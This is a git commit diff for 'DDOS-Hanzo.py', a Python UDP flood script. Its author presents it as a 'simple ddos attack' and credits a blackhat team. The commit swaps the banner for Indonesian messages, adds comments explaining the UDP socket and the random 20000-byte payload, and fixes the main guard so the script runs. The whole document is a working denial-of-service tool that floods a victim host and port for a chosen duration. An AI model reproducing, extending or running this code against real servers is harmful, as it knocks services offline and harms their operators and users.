9b3c2fcd7c3ed3682408c3cddd2cbd50313bf9a4
Mulyawan12 <87561422+Mulyawan12@users.noreply.github.com>
2021-09-09 11:00:16 +0700

    Update DDOS-Hanzo.py

--- DDOS-Hanzo.py
+++ DDOS-Hanzo.py
@@ -3,23 +3,17 @@ import socket
 import random
 import sys
 def usage():
-    print "#######################################################"
-    print "#                                                     #"
-    print "#                TOOLS BY HANZO-HYUGA                 #"
-    print "#                                                     #"
-    print "#             DDOS attack BY HANZO-HYUGA              #"
-    print "#             ++++==================++++              #"
-    print "#             TEAM : BLACKHAT TERSAKITI               #"
-    print "#               ME : HANZO-HYUGA17++                  #"
-    print "#           AUTHOR : HANZO BHT                        #"
-    print "#                                                     #"
-    print "#######################################################"
+       print "simple ddos attack"
+       print "authornya gua hanzo recode punya kumpulan remaja"
 def flood(victim, vport, duration):
+    # Support us yaakk... :)
+    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    # 20000 representasi satu byte ke server
     bytes = random._urandom(20000)
     timeout =  time.time() + duration
     sent = 3000
-    print "contoh : ping (webnya).com"
+
     while 1:
         if time.time() > timeout:
             break
@@ -35,5 +29,5 @@ def main():
     else:
         flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
 
-if _name_ == '_main_':
+if __name__ == '__main__':
     main()
